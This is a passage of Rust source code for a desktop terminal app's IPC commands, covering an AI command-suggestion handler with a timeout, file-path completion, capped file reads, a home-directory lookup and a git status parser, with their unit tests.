    pub cwd: Option<String>,
    /// Optional caller-supplied hard deadline in milliseconds.
    ///
    /// When `None` (or absent from the JSON payload), the command applies
    /// [`AI_SUGGEST_DEFAULT_TIMEOUT_MS`] — generous for LLM-backed providers
    /// but strictly under the Anthropic adapter's own 10 s cap.
    #[serde(default)]
    pub timeout_ms: Option<u64>,
}

/// Default AI suggest timeout in milliseconds when the caller does not pass
/// one. Set below Anthropic's 10 s absolute cap so a hung provider always
/// surfaces `Timeout` rather than a dangling future.
pub const AI_SUGGEST_DEFAULT_TIMEOUT_MS: u64 = 8_000;

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct AiSuggestReply {
    pub id: String,
    pub command: String,
    pub tier: String,
    pub modifiers: Vec<String>,
    pub ruleset_version: u32,
    pub rationale: Option<String>,
}

/// Serve a natural-language prompt through the shared `quanta-ai` provider.
///
/// The provider is cached on [`AppState`] and selected at app startup based
/// on `ANTHROPIC_API_KEY`: live `AnthropicProvider` when set, otherwise the
/// offline `MockProvider`.
///
/// FIX 2: the handler now calls `suggest_with_timeout` so a hung provider
/// surfaces a typed `Timeout` error instead of blocking the UI's "Ask AI"
/// spinner forever. The caller may override the default via `timeout_ms`;
/// when absent we apply [`AI_SUGGEST_DEFAULT_TIMEOUT_MS`] (8 s), strictly
/// under the Anthropic adapter's 10 s absolute cap so we never race it.
#[tauri::command]
pub async fn quanta_ai_suggest(
    args: AiSuggestArgs,
    state: State<'_, AppState>,
) -> Result<AiSuggestReply, TauriError> {
    let provider = state.suggestion_provider.clone();
    quanta_ai_suggest_with_provider(args, provider).await
}

/// Shared body between the Tauri command handler and the unit-test
/// entry point. Kept private to this module because its signature binds to
/// `Arc<dyn SuggestionProvider>` which callers outside the IPC crate cannot
/// usefully construct without re-rolling the provider stack.
async fn quanta_ai_suggest_with_provider(
    args: AiSuggestArgs,
    provider: Arc<dyn quanta_ai::SuggestionProvider>,
) -> Result<AiSuggestReply, TauriError> {
    use quanta_ai::SuggestionRequest;

    let mut req = SuggestionRequest::new(args.prompt);
    req.cwd = args.cwd;

    let timeout = std::time::Duration::from_millis(
        args.timeout_ms.unwrap_or(AI_SUGGEST_DEFAULT_TIMEOUT_MS),
    );

    let response = provider
        .suggest_with_timeout(req, timeout)
        .await
        .map_err(classify_ai_error)?;

    Ok(AiSuggestReply {
        id: response.id,
        command: response.classified.command,
        tier: response.classified.tier.label().to_string(),
        modifiers: response
            .classified
            .flags
            .as_slice()
            .iter()
            .map(|m| m.label().to_string())
            .collect(),
        ruleset_version: response.classified.ruleset_version,
        rationale: response.rationale,
    })
}

/// Map a `quanta-ai` provider error into the typed `TauriError` shape so the
/// UI can branch on `.code` rather than string-matching the message. Known
/// HTTP statuses / surface errors get dedicated codes; anything else collapses
/// to `bridge-internal` with the detail preserved in context.
pub(crate) fn classify_ai_error<E: std::fmt::Display>(err: E) -> TauriError {
    let msg = format!("{err}");
    let lower = msg.to_lowercase();
    if lower.contains("401")
        || lower.contains("unauthorized")
        || lower.contains("auth")
        || lower.contains("invalid api key")
    {
        return TauriError::ai_suggest_auth_failed();
    }
    if lower.contains("429") || lower.contains("rate limit") {
        return TauriError::ai_suggest_rate_limited();
    }
    if lower.contains("timeout") || lower.contains("timed out") {
        return TauriError::ai_suggest_timeout();
    }
    if lower.contains("network") || lower.contains("dns") || lower.contains("connection") {
        return TauriError::ai_suggest_network();
    }
    TauriError::bridge_internal(format!("ai-suggest: {msg}"))
}

/// Direct-callable variant for unit tests so we don't need a live Tauri
/// runtime / `State` wrapper. Shares the logic body with the command above
/// via [`quanta_ai_suggest_with_provider`], which applies the FIX-2 timeout.
#[cfg(test)]
async fn quanta_ai_suggest_impl(
    args: AiSuggestArgs,
    provider: Arc<dyn quanta_ai::SuggestionProvider>,
) -> Result<AiSuggestReply, TauriError> {
    quanta_ai_suggest_with_provider(args, provider).await
}

/* -------------------- list_completions -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct ListCompletionsArgs {
    pub prefix: String,
    pub cwd: String,
}

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "snake_case")]
pub struct CompletionEntry {
    pub name: String,
    pub insert: String,
    pub kind: String,
}

#[tauri::command]
pub async fn quanta_list_completions(
    args: ListCompletionsArgs,
) -> Result<Vec<CompletionEntry>, TauriError> {
    tokio::task::spawn_blocking(move || list_completions_impl(&args.prefix, &args.cwd))
        .await
        .map_err(|e| TauriError::bridge_internal(format!("list-completions: join error ({e})")))
}

fn expand_home_prefix(s: &str) -> String {
    #[allow(deprecated)]
    let home = std::env::home_dir();
    if s == "~" || s == "~/" {
        return home
            .map(|h| format!("{}/", h.to_string_lossy()))
            .unwrap_or_else(|| s.to_string());
    }
    if s.starts_with("~/") {
        if let Some(h) = home {
            return format!("{}/{}", h.to_string_lossy(), &s[2..]);
        }
    }
    s.to_string()
}

fn list_completions_impl(prefix: &str, cwd: &str) -> Vec<CompletionEntry> {
    let (orig_dir_part, name_prefix) = if let Some(idx) = prefix.rfind('/') {
        (&prefix[..=idx], &prefix[idx + 1..])
    } else {
        ("", prefix)
    };

    let expanded_dir = expand_home_prefix(orig_dir_part);

    let dir_abs = if expanded_dir.is_empty() {
        PathBuf::from(cwd)
    } else if expanded_dir.starts_with('/') {
        PathBuf::from(&expanded_dir)
    } else {
        PathBuf::from(cwd).join(&expanded_dir)
    };

    let read_dir = match std::fs::read_dir(&dir_abs) {
        Ok(rd) => rd,
        Err(_) => return vec![],
    };

    let name_lower = name_prefix.to_lowercase();
    let show_hidden = name_prefix.starts_with('.');

    let mut dirs: Vec<CompletionEntry> = vec![];
    let mut files: Vec<CompletionEntry> = vec![];

    for entry in read_dir.flatten() {
        let file_name = entry.file_name();
        let name = file_name.to_string_lossy().to_string();

        if name.starts_with('.') && !show_hidden {
            continue;
        }
        if !name.to_lowercase().starts_with(&name_lower) {
            continue;
        }

        let file_type = match entry.file_type() {
            Ok(ft) => ft,
            Err(_) => continue,
        };

        let is_dir = if file_type.is_symlink() {
            entry.path().is_dir()
        } else {
            file_type.is_dir()
        };

        let kind: &str = if is_dir {
            "dir"
        } else {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if entry
                    .metadata()
                    .map(|m| m.permissions().mode() & 0o111 != 0)
                    .unwrap_or(false)
                {
                    "exec"
                } else {
                    "file"
                }
            }
            #[cfg(not(unix))]
            {
                "file"
            }
        };

        let insert = if is_dir {
            format!("{orig_dir_part}{name}/")
        } else {
            format!("{orig_dir_part}{name}")
        };

        let completion = CompletionEntry {
            name,
            insert,
            kind: kind.to_string(),
        };

        if is_dir {
            dirs.push(completion);
        } else {
            files.push(completion);
        }
    }

    dirs.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    files.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    dirs.extend(files);
    dirs.truncate(64);
    dirs
}

/* -------------------- read_text_file -------------------- */

/// Hard absolute cap on `ReadTextFileArgs::max_bytes`. Callers can request
/// smaller caps but we refuse to read more than this many bytes in one IPC
/// round-trip. 64 KiB is ample for tiny metadata files (`.git/HEAD`, config
/// snippets) while keeping the IPC string payload bounded.
pub const READ_TEXT_FILE_ABSOLUTE_CAP: u64 = 64 * 1024;

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct ReadTextFileArgs {
    /// Absolute filesystem path. Relative paths are rejected.
    pub path: String,
    /// Caller-supplied byte cap. Clamped to [`READ_TEXT_FILE_ABSOLUTE_CAP`].
    #[serde(default)]
    pub max_bytes: Option<u64>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct ReadTextFileReply {
    /// UTF-8 contents; `None` when the file does not exist.
    pub content: Option<String>,
    /// `true` iff the file did not exist at read time. A caller that polls
    /// `.git/HEAD` uses this to decide "not a git repo" without a rejection.
    pub missing: bool,
    /// `true` iff the on-disk file was larger than the effective cap and we
    /// returned only the leading bytes.
    pub truncated: bool,
}

/// Read a small UTF-8 text file. Used by the UI to enrich the status bar
/// (branch indicator, etc.) without shelling out. The path is validated
/// (absolute + no control chars) and the payload is capped at
/// [`READ_TEXT_FILE_ABSOLUTE_CAP`] regardless of the `max_bytes` argument.
///
/// A missing file is NOT an error — callers (e.g. `features/git-branch`)
/// explicitly poll a path that may or may not exist depending on cwd.
#[tauri::command]
pub async fn quanta_read_text_file(
    args: ReadTextFileArgs,
) -> Result<ReadTextFileReply, TauriError> {
    read_text_file_impl(args)
}

fn read_text_file_impl(args: ReadTextFileArgs) -> Result<ReadTextFileReply, TauriError> {
    validate_read_path(&args.path).map_err(TauriError::bridge_internal)?;

    let cap = args
        .max_bytes
        .map(|n| n.min(READ_TEXT_FILE_ABSOLUTE_CAP))
        .unwrap_or(READ_TEXT_FILE_ABSOLUTE_CAP)
        .max(1);

    let path = Path::new(&args.path);
    let mut file = match fs::File::open(path) {
        Ok(f) => f,
        Err(err) if err.kind() == io::ErrorKind::NotFound => {
            return Ok(ReadTextFileReply {
                content: None,
                missing: true,
                truncated: false,
            });
        }
        Err(err) => {
            return Err(TauriError::bridge_internal(format!(
                "read-text-file: open failed ({})",
                err.kind()
            )));
        }
    };

    // Read up to cap + 1 so we can detect truncation without allocating a
    // ballooned buffer for enormous files.
    let to_read = cap.saturating_add(1).min(usize::MAX as u64) as usize;
    let mut buf = Vec::with_capacity(to_read.min(4096));
    file.by_ref()
        .take(to_read as u64)
        .read_to_end(&mut buf)
        .map_err(|e| {
            TauriError::bridge_internal(format!("read-text-file: read failed ({})", e.kind()))
        })?;

    let truncated = buf.len() > cap as usize;
    if truncated {
        buf.truncate(cap as usize);
    }
    let text = String::from_utf8(buf)
        .map_err(|_| TauriError::bridge_internal("read-text-file: not valid UTF-8"))?;

    Ok(ReadTextFileReply {
        content: Some(text),
        missing: false,
        truncated,
    })
}

/* -------------------- get_home_dir -------------------- */

/// Reply for [`quanta_get_home_dir`]. `path` is `None` when HOME could not
/// be determined — callers branch on `null` and skip whatever feature
/// needed it (e.g. shell-history auto-import).
#[derive(Debug, Serialize, PartialEq, Eq, Clone)]
#[serde(rename_all = "snake_case")]
pub struct GetHomeDirReply {
    pub path: Option<String>,
}

/// Return the current user's home directory as the OS reports it.
/// Never rejects — an absent HOME resolves to `{ path: null }`.
///
/// Implementation prefers the platform-native lookup (via `std::env::home_dir`
/// on all platforms) over reading `$HOME` directly so we still answer
/// correctly in cgroup-jailed environments that strip env vars but keep the
/// passwd database populated.
#[tauri::command]
pub async fn quanta_get_home_dir() -> Result<GetHomeDirReply, TauriError> {
    Ok(get_home_dir_impl())
}

fn get_home_dir_impl() -> GetHomeDirReply {
    #[allow(deprecated)]
    let path = std::env::home_dir().and_then(|p| p.to_str().map(|s| s.to_string()));
    GetHomeDirReply { path }
}

/* -------------------- git_status -------------------- */

/// Hard wall-clock deadline for `git status`. The command is dominated by
/// the index scan and is reliably sub-second on real repos; 2 s is generous
/// and keeps the UI responsive if the repo lives on a slow mount or the
/// user just cancelled a pack operation.
pub const GIT_STATUS_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(2);

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct GitStatusArgs {
    /// Absolute path to the repo root. MUST contain a `.git` entry (file
    /// or directory — submodules and worktrees use a `.git` FILE pointing
    /// at the real gitdir; either form is acceptable).
    pub repo_root: String,
}

#[derive(Debug, Serialize, PartialEq, Eq, Clone)]
#[serde(rename_all = "snake_case")]
pub struct GitStatusReply {
    pub branch: Option<String>,
    pub dirty: bool,
    pub ahead: u32,
    pub behind: u32,
    pub detached: bool,
}

/// Parsed porcelain-v2 output. Pulled out of the command handler so the
/// parser can be unit-tested without spawning `git`.
pub(crate) fn parse_porcelain_v2(stdout: &str) -> GitStatusReply {
    // Defaults: treat "we couldn't parse anything" as a conservative clean
    // state with no branch. The UI falls back to the `.git/HEAD` reader for
    // branch-only when this returns an empty result.
    let mut branch: Option<String> = None;
    let mut detached = false;
    let mut dirty = false;
    let mut ahead: u32 = 0;
    let mut behind: u32 = 0;

    for line in stdout.lines() {
        // Branch / upstream headers are `# branch.<field> <value>`. The
        // fields we care about:
        //   # branch.head <name|(detached)>
        //   # branch.ab +N -M         (only emitted when upstream is set)
        // Anything else (oid, upstream name) is fine to ignore.
        if let Some(rest) = line.strip_prefix("# branch.head ") {
            let value = rest.trim();
            if value == "(detached)" {
                detached = true;
            } else if !value.is_empty() {
                branch = Some(value.to_string());
            }
            continue;
        }
        if let Some(rest) = line.strip_prefix("# branch.ab ") {
            // "+3 -1" — tolerate arbitrary whitespace, ignore missing signs.
            let mut it = rest.split_whitespace();
            if let Some(tok) = it.next() {
                ahead = tok.trim_start_matches('+').parse().unwrap_or(0);
            }
            if let Some(tok) = it.next() {
                behind = tok.trim_start_matches('-').parse().unwrap_or(0);
            }
            continue;
        }
        // Header lines we don't care about start with `# `.
        if line.starts_with("# ") {
            continue;
        }
        // Any non-header line is a tracked/untracked/unmerged entry.
        // Porcelain-v2 prefixes:
        //   "1 " = changed entry (modified / added / etc.)
        //   "2 " = renamed/copied entry
        //   "u " = unmerged
        //   "? " = untracked
        //   "! " = ignored (we never emit this without --ignored, but
        //          stay defensive)
        // Ignored files do NOT make the tree dirty; everything else does.
        match line.chars().next() {
            Some('1') | Some('2') | Some('u') | Some('?') => dirty = true,
            _ => {}
        }
    }

    GitStatusReply {
        branch,
        dirty,
        ahead,
        behind,
        detached,
    }
}

/// Run `git status --porcelain=v2 --branch --no-renames` in `repo_root` and
/// return a parsed summary, or `None` when the directory is not a git repo
/// / git is not on PATH / the command timed out.
///
/// Pure `std::process::Command` — direct exec, no shell. The only caller-
/// controlled input (`repo_root`) is passed as a `current_dir`, not as an
/// argv element, so there is no shell-metacharacter attack surface.
#[tauri::command]
pub async fn quanta_git_status(args: GitStatusArgs) -> Result<Option<GitStatusReply>, TauriError> {
    // Validate on the async thread so we don't block Tokio with the
    // process spawn.
    validate_repo_root(&args.repo_root).map_err(TauriError::bridge_internal)?;

    let repo_root = args.repo_root.clone();
    tokio::task::spawn_blocking(move || run_git_status_blocking(&repo_root))
        .await
        .map_err(|e| TauriError::bridge_internal(format!("git-status: join error ({e})")))
}

/// Blocking body: spawn git, wait with a bounded timeout, parse.
///
/// A missing/invalid repo OR git-not-found OR timeout all collapse to
/// `Ok(None)` — the UI treats them identically as "no extra info for this
/// cwd". We only ever emit `Err` for genuinely unexpected I/O failures
/// (OOM during spawn, etc.), which the UI wrapper swallows anyway.
fn run_git_status_blocking(repo_root: &str) -> Option<GitStatusReply> {
    use std::process::Stdio;

    // Defense in depth: the repo MUST exist and be a directory. Git would
    // error out itself, but a pre-check lets us skip the spawn entirely
    // when the cwd is obviously not a repo.
    let path = Path::new(repo_root);
    if !path.is_dir() {
        return None;
    }
    let dot_git = path.join(".git");
    if !dot_git.exists() {
        return None;
    }

    let mut cmd = Command::new("git");
    // --no-optional-locks keeps git from fighting a concurrent `git gc`
    // over the `.git/index.lock` — we're read-only, we don't need a write
    // lock. Plus a couple of belt-and-braces env hygiene flags:
    //   - GIT_OPTIONAL_LOCKS=0 mirrors the flag for older gits;
    //   - GIT_TERMINAL_PROMPT=0 prevents a runaway credential prompt on a
    //     misconfigured repo (unlikely on `status` but cheap to set).
    cmd.arg("-c")
        .arg("core.optionalLocks=false")
        .arg("status")
        .arg("--porcelain=v2")
        .arg("--branch")
        .arg("--no-renames")
        .current_dir(path)
        .env("GIT_OPTIONAL_LOCKS", "0")
        .env("GIT_TERMINAL_PROMPT", "0")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(_) => return None, // git not on PATH — degrade silently.
    };

    // Busy-wait-with-sleep is ugly but portable and keeps the dependency
    // surface tiny. The timeout window is 2 s with 25 ms polling, so we
    // burn at most ~80 polls per call.
    let deadline = std::time::Instant::now() + GIT_STATUS_TIMEOUT;
    loop {
        match child.try_wait() {
            Ok(Some(_status)) => break,
            Ok(None) => {
                if std::time::Instant::now() >= deadline {
                    // Best-effort kill; on Unix this delivers SIGKILL.
                    let _ = child.kill();
                    let _ = child.wait();
                    return None;
                }
                std::thread::sleep(std::time::Duration::from_millis(25));
            }
            Err(_) => return None,
        }
    }

    // At this point the child is reaped; collect stdout.
    let output = match child.wait_with_output() {
        Ok(o) => o,
        Err(_) => return None,
    };
    if !output.status.success() {
        // "fatal: not a git repository" etc. Treat as no-info.
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    Some(parse_porcelain_v2(&stdout))
}

/// Reject obviously bad repo-root paths at the IPC boundary. Same shape as
/// `validate_read_path` — absolute, no control chars — plus we additionally
/// stat the path so a hostile frontend can't push us to spawn `git` in an
/// unrelated directory (e.g. `/` or a mount we don't own).
fn validate_repo_root(path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err("git-status: empty repo_root".into());
    }
    for ch in path.chars() {
        if ch == '\0' || ch == '\n' || ch == '\r' {
            return Err("git-status: repo_root contains control chars".into());
        }
    }
    let p = Path::new(path);
    if !p.is_absolute() {
        return Err("git-status: repo_root must be absolute".into());
    }
    Ok(())
}

/// Reject obviously bad paths at the IPC boundary. We require an absolute
/// path (no relative-path surprises bound to whatever Tauri's cwd happens to
/// be) and reject control chars that never appear in legitimate POSIX/NT
/// paths — consistent with `validate_editor_path` elsewhere in this module.
fn validate_read_path(path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err("read-text-file: empty path".into());
    }
    for ch in path.chars() {
        if ch == '\0' || ch == '\n' || ch == '\r' {
            return Err("read-text-file: path contains control chars".into());
        }
    }
    let p = Path::new(path);
    if !p.is_absolute() {
        return Err("read-text-file: path must be absolute".into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_editor_path_rejects_empty() {
        assert!(validate_editor_path("").is_err());
    }

    #[test]
    fn validate_editor_path_rejects_control_chars() {
        assert!(validate_editor_path("/tmp/a\x01b").is_err());
        assert!(validate_editor_path("/tmp/a\tb").is_err());
        assert!(validate_editor_path("/tmp/a\x7fb").is_err());
    }

    #[test]
    fn validate_editor_path_rejects_newline_and_nul() {
        assert!(validate_editor_path("/tmp/a\nb").is_err());
        assert!(validate_editor_path("/tmp/a\rb").is_err());
        assert!(validate_editor_path("/tmp/a\0b").is_err());
    }

    #[test]
    fn validate_editor_path_accepts_normal_paths() {
        assert!(validate_editor_path("/tmp/foo.rs").is_ok());
        assert!(validate_editor_path("/Users/alice/Code new/main.ts").is_ok());
    }

    #[test]
    fn parse_porcelain_v2_clean_tree_on_branch() {
        let out = "# branch.oid 1234abcd\n\
                   # branch.head main\n\
                   # branch.upstream origin/main\n\
                   # branch.ab +0 -0\n";
        let r = parse_porcelain_v2(out);
        assert_eq!(r.branch.as_deref(), Some("main"));
        assert!(!r.detached);
        assert!(!r.dirty);
        assert_eq!(r.ahead, 0);
        assert_eq!(r.behind, 0);
    }

    #[test]
    fn parse_porcelain_v2_detached_head() {
        let out = "# branch.oid abcd1234\n\
                   # branch.head (detached)\n";
        let r = parse_porcelain_v2(out);
        assert!(r.detached);
        assert!(r.branch.is_none());
        assert!(!r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_untracked_makes_tree_dirty() {
        let out = "# branch.head main\n\
                   ? src/new-file.rs\n";
        let r = parse_porcelain_v2(out);
        assert!(r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_staged_and_unstaged_are_dirty() {
        let out = "# branch.head main\n\
                   1 .M N... 100644 100644 100644 aaa bbb src/foo.rs\n\
                   1 M. N... 100644 100644 100644 aaa bbb src/bar.rs\n";
        let r = parse_porcelain_v2(out);
        assert!(r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_unmerged_is_dirty() {
        let out = "# branch.head main\n\
                   u UU N... 100644 100644 100644 100644 aaa bbb ccc src/conflict.rs\n";
        let r = parse_porcelain_v2(out);
        assert!(r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_rename_entry_is_dirty() {
        let out = "# branch.head main\n\
                   2 R. N... 100644 100644 100644 aaa bbb R100 new\tsrc/old\n";
        let r = parse_porcelain_v2(out);
        assert!(r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_ahead_behind() {
        let out = "# branch.head feature/x\n\
                   # branch.ab +3 -1\n";
        let r = parse_porcelain_v2(out);
        assert_eq!(r.branch.as_deref(), Some("feature/x"));
        assert_eq!(r.ahead, 3);
        assert_eq!(r.behind, 1);
        assert!(!r.dirty);
    }

    #[test]
    fn parse_porcelain_v2_ahead_only() {
        let out = "# branch.head main\n# branch.ab +5 -0\n";
        let r = parse_porcelain_v2(out);
        assert_eq!(r.ahead, 5);
        assert_eq!(r.behind, 0);
    }

    #[test]
    fn parse_porcelain_v2_behind_only() {
        let out = "# branch.head main\n# branch.ab +0 -2\n";
        let r = parse_porcelain_v2(out);
        assert_eq!(r.ahead, 0);
        assert_eq!(r.behind, 2);
    }

    #[test]
    fn parse_porcelain_v2_diverged_and_dirty() {
        let out = "# branch.head main\n\
                   # branch.ab +2 -3\n\
                   1 .M N... 100644 100644 100644 aaa bbb src/foo.rs\n\
                   ? src/new-file.rs\n";
        let r = parse_porcelain_v2(out);
        assert!(r.dirty);
        assert_eq!(r.ahead, 2);
        assert_eq!(r.behind, 3);
    }

    #[test]
    fn parse_porcelain_v2_empty_is_clean() {
        let r = parse_porcelain_v2("");
        assert!(r.branch.is_none());
        assert!(!r.dirty);
        assert_eq!(r.ahead, 0);
        assert_eq!(r.behind, 0);
        assert!(!r.detached);
    }

    #[test]
    fn validate_repo_root_rejects_bad_inputs() {
        assert!(validate_repo_root("").is_err());
        assert!(validate_repo_root("relative/dir").is_err());
        assert!(validate_repo_root("/tmp/a\0b").is_err());
        assert!(validate_repo_root("/tmp/a\nb").is_err());
        assert!(validate_repo_root("/tmp/ok").is_ok());
    }

    #[test]
    fn run_git_status_blocking_returns_none_for_non_repo_dir() {
        let tmp = std::env::temp_dir().join("quanta-git-status-not-a-repo-xyz");
        let _ = std::fs::create_dir_all(&tmp);
        let r = run_git_status_blocking(&tmp.to_string_lossy());
        assert!(r.is_none());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn run_git_status_blocking_returns_none_for_missing_dir() {
        let r = run_git_status_blocking("/tmp/quanta-definitely-nonexistent-xyz-789");
        assert!(r.is_none());
    }

    #[test]
    fn validate_read_path_rejects_relative_and_control_chars() {
        assert!(validate_read_path("").is_err());
        assert!(validate_read_path("relative/path").is_err());
        assert!(validate_read_path("/tmp/a\0b").is_err());
        assert!(validate_read_path("/tmp/a\nb").is_err());
        assert!(validate_read_path("/tmp/ok.txt").is_ok());
    }

    #[test]
    fn read_text_file_returns_missing_for_nonexistent_path() {
        // Use a path that definitely does not exist.
        let tmp = std::env::temp_dir().join("quanta-nonexistent-xyz-readtest-unique-12345");
        let reply = read_text_file_impl(ReadTextFileArgs {
            path: tmp.to_string_lossy().to_string(),
            max_bytes: None,
        })
        .expect("missing file is not an error");
        assert!(reply.missing);
        assert!(reply.content.is_none());
        assert!(!reply.truncated);
    }

    #[test]
    fn read_text_file_returns_content_for_small_file() {
        let tmp = std::env::temp_dir().join("quanta-read-text-file-test.txt");
        std::fs::write(&tmp, "hello world").unwrap();
        let reply = read_text_file_impl(ReadTextFileArgs {
            path: tmp.to_string_lossy().to_string(),
            max_bytes: Some(1024),
        })
        .expect("readable file should succeed");
        assert!(!reply.missing);
        assert_eq!(reply.content.as_deref(), Some("hello world"));
        assert!(!reply.truncated);
        let _ = std::fs::remove_file(&tmp);
    }

    #[test]
    fn read_text_file_truncates_when_file_exceeds_cap() {
        let tmp = std::env::temp_dir().join("quanta-read-text-file-cap.txt");
        std::fs::write(&tmp, "abcdefghij").unwrap();
        let reply = read_text_file_impl(ReadTextFileArgs {
            path: tmp.to_string_lossy().to_string(),
            max_bytes: Some(4),
        })
        .expect("cap should apply, not error");
        assert!(!reply.missing);
        assert_eq!(reply.content.as_deref(), Some("abcd"));
        assert!(reply.truncated);
        let _ = std::fs::remove_file(&tmp);
    }

    #[test]
    fn get_home_dir_impl_returns_something_or_none() {
        // We can't assume a specific HOME in CI, but the call must never
        // panic and the result must be well-formed (either a non-empty
        // string or `None`). This guards against a regression where the
        // implementation might start to propagate an error on a missing
        // HOME rather than resolving to `None`.
        let reply = get_home_dir_impl();
        match reply.path {
            Some(s) => assert!(!s.is_empty()),
            None => {}
        }
    }

    #[test]
    fn event_name_constants_use_hyphens_not_dots() {
        assert!(!EVENT_PTY_DATA.contains('.'));
        assert!(!EVENT_PTY_EXIT.contains('.'));
        assert!(EVENT_PTY_DATA.contains('-'));
        assert!(EVENT_PTY_EXIT.contains('-'));
    }

    fn mock() -> Arc<dyn quanta_ai::SuggestionProvider> {
        Arc::new(quanta_ai::MockProvider::new())
    }

    #[tokio::test]
    async fn ai_suggest_returns_safe_for_default_prompt() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "list files please".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock provider should succeed");
        assert_eq!(reply.tier, "safe");
        assert_eq!(reply.ruleset_version, quanta_ai::RULESET_VERSION);
        assert!(!reply.command.is_empty());
    }

    #[tokio::test]
    async fn ai_suggest_blocks_delete_everything() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "please delete everything".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock provider should succeed");
        assert_eq!(reply.tier, "blocked");
    }

    #[tokio::test]
    async fn ai_suggest_rejects_empty_prompt() {
        let err = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "   ".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect_err("empty prompt must reject");
        // The Rust-side classifier doesn't have a dedicated "empty prompt"
        // code today, so the default `bridge-internal` bucket is expected.
        // The detail is still accessible via `context.detail` for logging.
        assert_eq!(err.code, ErrorCode::BridgeInternal);
    }

    /// FIX 2: a short `timeout_ms` must surface the provider's `Timeout`
    /// variant, classified via `classify_ai_error` into `AiSuggestTimeout`.
    /// We wrap the mock in a delaying decorator so the caller's deadline
    /// fires BEFORE the mock would have returned a canned reply.
    #[tokio::test]
    async fn ai_suggest_surfaces_timeout_when_provider_is_slow() {
        use std::time::Duration;

        #[derive(Debug)]
        struct SlowProvider {
            inner: quanta_ai::MockProvider,
            delay: Duration,
        }

        #[async_trait::async_trait]
        impl quanta_ai::SuggestionProvider for SlowProvider {
            async fn suggest(
                &self,
                req: quanta_ai::SuggestionRequest,
            ) -> Result<quanta_ai::SuggestionResponse, quanta_ai::SuggestionProviderError>
            {
                tokio::time::sleep(self.delay).await;
                self.inner.suggest(req).await
            }
        }

        let slow: Arc<dyn quanta_ai::SuggestionProvider> = Arc::new(SlowProvider {
            inner: quanta_ai::MockProvider::new(),
            delay: Duration::from_secs(2),
        });

        let err = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "list files please".into(),
                cwd: None,
                timeout_ms: Some(25),
            },
            slow,
        )
        .await
        .expect_err("slow provider + short timeout must surface Timeout");
        assert_eq!(
            err.code,
            ErrorCode::AiSuggestTimeout,
            "classifier must map provider Timeout to AiSuggestTimeout code"
        );
    }

    /// FIX 2: the default timeout is generous enough that a fast mock
    /// provider returns cleanly. Regressing the default below the MockProvider's
    /// wall-clock cost would break this test before shipping.
    #[tokio::test]
    async fn ai_suggest_default_timeout_lets_fast_providers_succeed() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "git status please".into(),
                cwd: None,
                // None → applies AI_SUGGEST_DEFAULT_TIMEOUT_MS (8 s).
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock under default timeout must succeed");
        assert!(!reply.command.is_empty());
    }

    /// FIX 2: pin the default timeout value. A regression that silently
    /// bumped the default past Anthropic's 10 s cap would make the hard
    /// deadline useless; keep this assertion tight.
    #[test]
    fn ai_suggest_default_timeout_is_under_anthropic_cap() {
        // Anthropic's hard cap is 10 s; our default MUST be strictly under
        // so the caller's deadline fires first.
        assert!(AI_SUGGEST_DEFAULT_TIMEOUT_MS < 10_000);
        // And strictly positive so we never ship a zero-duration default.
        assert!(AI_SUGGEST_DEFAULT_TIMEOUT_MS > 0);
    }

    /// Pin the AI classifier on a representative sample of provider errors.
    /// Adding a new code to `TauriError` without adding a case here shows up
    /// red so the TS UI never silently falls through to `unknown`.
    #[test]
    fn ai_error_classifier_maps_known_strings() {
        // A raw `String` impls `Display`, which is all `classify_ai_error`
        // needs — keeps the test free of the provider trait's machinery.
        assert_eq!(
            classify_ai_error("HTTP 401 unauthorized").code,
            ErrorCode::AiSuggestAuthFailed
        );
        assert_eq!(
            classify_ai_error("HTTP 429 rate limit exceeded").code,
            ErrorCode::AiSuggestRateLimited
        );
        assert_eq!(
            classify_ai_error("request timed out").code,
            ErrorCode::AiSuggestTimeout
        );
        assert_eq!(
            classify_ai_error("network unreachable: dns lookup").code,
            ErrorCode::AiSuggestNetwork
        );
        // Default fallback: anything else is bridge-internal (with the raw
        // detail tucked into context — never directly in user_message).
        let e = classify_ai_error("weird thing happened");
        assert_eq!(e.code, ErrorCode::BridgeInternal);
        assert!(!e.user_message.contains("weird thing happened"));
    }

    /// Idempotency-friendly error patterns the cancel path must swallow.
    /// Unit-tested against the classification helper so we don't need a live
    /// sidecar to pin the behavior. Keeps future edits to the error list
    /// honest — adding a pattern without adding a case here shows up red.
    #[test]
    fn cancel_error_classifier_treats_terminal_errors_as_idempotent() {
        let idempotent_samples = [
            "unknown session abc",
            "block already canceled",
            "block not found",
